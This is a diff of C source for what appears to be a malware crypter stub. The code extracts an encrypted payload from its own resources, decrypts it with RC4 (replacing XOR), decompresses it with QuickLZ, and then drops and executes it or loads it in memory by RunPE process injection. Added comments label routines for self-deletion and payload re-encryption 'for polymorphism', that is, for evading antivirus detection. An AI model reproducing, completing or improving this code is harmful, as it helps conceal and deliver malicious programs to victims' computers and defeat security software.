@@ -8,11 +8,12 @@
 #include "quicklz.h"
 
 #define WIN32_LEAN_AND_MEAN
-#define DEBUG
+//#define DEBUG
 #define DEBUG_TITLE "STUB - DEBUG MESSAGE"
 
 typedef VOID(*PZUVOS)(HANDLE, PVOID);
 
+/* Self explanatory */
 VOID Debug(LPCSTR fmt, ...) {
 #ifdef DEBUG
 	CHAR szDebugBuf[BUFSIZ];
@@ -26,6 +27,7 @@ VOID Debug(LPCSTR fmt, ...) {
 #endif
 }
 
+/* Extracts and parses the resource information into FileStruct */
 FileStruct *ExtractFile(VOID) {
 	FileStruct *fs = (FileStruct *)malloc(sizeof(*fs));
 	if (fs == NULL) return NULL;
@@ -97,6 +99,7 @@ FileStruct *ExtractFile(VOID) {
 	return fs;
 }
 
+/* Modifies the resources with a modified FileStruct */
 BOOL UpdateResources(FileStruct *fs, LPCSTR szFileName) {
 	HANDLE hUpdate = BeginUpdateResource(szFileName, FALSE);
 	// add file as a resource to stub
@@ -118,6 +121,7 @@ BOOL UpdateResources(FileStruct *fs, LPCSTR szFileName) {
 	return TRUE;
 }
 
+/* Random key generator */
 BOOL GenerateKey(FileStruct *fs) {
 	fs->pKey = (PBYTE)malloc(KEY_LEN);
 	if (fs->pKey == NULL) return FALSE;
@@ -150,24 +154,27 @@ BOOL GenerateKey(FileStruct *fs) {
 	return TRUE;
 }
 
-// XOR
+/* Payload decryption routine using RC4 */
 BOOL DecryptPayload(FileStruct *fs) {
-	PBYTE pDecryptedBuffer = (PBYTE)malloc(fs->dwBufSize);
-	if (pDecryptedBuffer == NULL) return FALSE;
+	PBYTE pTempBuffer = malloc(fs->dwBufSize);
+	memcpy(pTempBuffer, fs->pBuffer, fs->dwBufSize);
 
-	for (DWORD i = 0; i < fs->dwBufSize; i++)
-		pDecryptedBuffer[i] = fs->pBuffer[i] ^ fs->pKey[i % KEY_LEN];
+	struct rc4_state *s = malloc(sizeof(struct rc4_state));
+	rc4_setup(s, fs->pKey, KEY_LEN);
+	rc4_crypt(s, pTempBuffer, fs->dwBufSize);
+	free(s);
 
-	fs->pBuffer = pDecryptedBuffer;
+	fs->pBuffer = pTempBuffer;
 
 	return TRUE;
 }
 
-// XOR
+/* Payload encryption routine using RC4 for polymorphism */
 BOOL Encrypt(FileStruct *fs) {
 	return DecryptPayload(fs);
 }
 
+/* Payload decompression routine using QuickLZ */
 BOOL DecompressFile(FileStruct *fs) {
 	ULONG ulDecompressedBufSize = qlz_size_decompressed((char *)fs->pBuffer);
 	PBYTE pDecompressedBuffer = (PBYTE)malloc(ulDecompressedBufSize);
@@ -181,6 +188,7 @@ BOOL DecompressFile(FileStruct *fs) {
 	return TRUE;
 }
 
+/* Payload dropper and executer */
 VOID ExecutePayload(FileStruct *fs, LPCSTR szFileName) {
 	DWORD dwWritten;
 	HANDLE hFile = CreateFile(szFileName, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
@@ -189,6 +197,7 @@ VOID ExecutePayload(FileStruct *fs, LPCSTR szFileName) {
 	ShellExecute(NULL, NULL, szFileName, NULL, NULL, SW_NORMAL);
 }
 
+/* In-memory payload execution */
 BOOL RunPE(FileStruct *fs) {
 	// PE headers
 	PIMAGE_DOS_HEADER pidh;
@@ -287,6 +296,7 @@ BOOL RunPE(FileStruct *fs) {
 	return TRUE;
 }
 
+/* Self-destructing routine */
 VOID SelfDelete(LPCSTR szFileName) {
 	PROCESS_INFORMATION pi = { 0 };
 	STARTUPINFO si = { 0 };
@@ -300,6 +310,7 @@ VOID SelfDelete(LPCSTR szFileName) {
 	}
 }
 
+/* Payload polymorpher to re-encrypt payload */
 BOOL PolymorphPayload(LPCSTR szFileName) {
 	MoveFile(szFileName, "old.exe");
 	CopyFile("old.exe", szFileName, FALSE);
